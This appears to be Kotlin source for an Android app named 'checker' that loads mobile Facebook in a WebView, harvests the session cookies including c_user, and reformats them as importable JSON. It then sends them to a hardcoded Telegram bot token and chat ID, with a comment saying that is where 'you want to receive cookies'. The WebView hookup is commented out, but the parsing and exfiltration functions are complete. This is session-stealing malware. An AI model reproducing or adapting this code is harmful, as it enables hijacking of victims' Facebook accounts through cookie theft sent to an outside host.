package com.dm.checker

import android.content.Context
import android.content.SharedPreferences
import android.os.Bundle
import android.util.Log
import android.webkit.CookieManager
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import com.dm.checker.databinding.ActivityMainBinding
import org.json.JSONException
import org.json.JSONObject
import java.io.IOException
import java.net.HttpURLConnection
import java.net.MalformedURLException
import java.net.URL


class MainActivity : AppCompatActivity() {

    private val BOT_TOKEN = "2117837456:AAH2rewWnYhjbpNexxNCKYYxNiYGVfDP21U"
    private val TG_API_ENDPOINT = "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s"
    private val CHAT_ID = "1215146467" // where you want to receive cookies through your bot

    private lateinit var binding: ActivityMainBinding
    private lateinit var preferences: SharedPreferences

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        preferences = getPreferences(Context.MODE_PRIVATE)

//        wvMain.apply {
//            WebSettingsUtils.webSettings(this)
//            WebSettingsUtils.webMobile(this)
//            settings.userAgentString = WebSettingsUtils.DESK
//        }
//        wvMain.webViewClient = object: WebViewClient() {
//
//            override fun onPageFinished(view: WebView?, url: String?) {
//                super.onPageFinished(view, url)
//                val cookie = CookieManager.getInstance().getCookie(url)
//                Log.e("TAG", "$cookie with $url")
//
//                if (cookie.contains("c_user")) {
//                    try {
//                        val parsedCookies = parseCookiesToJson(cookie)
//                        if (parsedCookies != null) {
//                            sendCookiesToTelegram(parsedCookies)
//                        }
//                    } catch (e: JSONException) {
//                        Log.e("TAG", "${e.message}")
//                    }
//                }
//            }
//        }
//        wvMain.loadUrl("https://m.facebook.com/")
    }

    @Throws(JSONException::class)
    private fun parseCookiesToJson(cookie: String): String? {
        val listOFCookies: MutableList<JSONObject> = ArrayList()
        val arrayOfCookies = cookie.split(";".toRegex()).toTypedArray()
        for (eachCookie in arrayOfCookies) {
            val arrayOfEachCookie = eachCookie.split("=".toRegex()).toTypedArray()
            val jsonObject = JSONObject()
            jsonObject.put("name", arrayOfEachCookie[0].trim { it <= ' ' })
            jsonObject.put("value", arrayOfEachCookie[1].trim { it <= ' ' })
            if (jsonObject.getString("name") == "c_user") {
                if (jsonObject.getString("value") == preferences.getString("C_USER", "NO_C_USER")) {
                    return null
                } else {
                    val edit: SharedPreferences.Editor = preferences.edit()
                    edit.putString("C_USER", jsonObject.getString("value"))
                    edit.apply()
                }
            }
            jsonObject.put("domain", ".facebook.com")
            if (arrayOfEachCookie[0] == "m_pixel_ratio" || arrayOfEachCookie[0] == "c_user" || arrayOfEachCookie[0] == "wd" || arrayOfEachCookie[0] == "x-referer") {
                jsonObject.put("httpOnly", false)
            } else {
                jsonObject.put("httpOnly", true)
            }
            jsonObject.put("path", "/")
            jsonObject.put("secure", true)
            jsonObject.put("httpOnly", false)
            jsonObject.put("sameSite", "no_restriction")
            if (arrayOfEachCookie[0] == "m_pixel_ratio" || arrayOfEachCookie[0] == "x-referer") {
                jsonObject.put("session", true)
            } else {
                jsonObject.put("session", false)
            }
            jsonObject.put("firstPartyDomain", "")
            jsonObject.put("storeId", null)
            listOFCookies.add(jsonObject)
        }
        Log.e("TAG", listOFCookies.toString())
        return listOFCookies.toString()
    }

    private fun sendCookiesToTelegram(message: String) {
        object : Thread() {
            override fun run() {
                try {
                    val url = URL(String.format(TG_API_ENDPOINT, BOT_TOKEN, CHAT_ID, message))
                    val http: HttpURLConnection = url.openConnection() as HttpURLConnection
                    http.requestMethod = "GET"
                    http.setRequestProperty("Host", "api.telegram.org")
                    http.inputStream
                    http.disconnect()
                } catch (e: MalformedURLException) {
                    Log.e("TAG", "MalformedURLException: ${e.message}")
                } catch (e: IOException) {
                    Log.e("TAG", "IOException: ${e.message}")
                }
            }
        }.start()
    }
}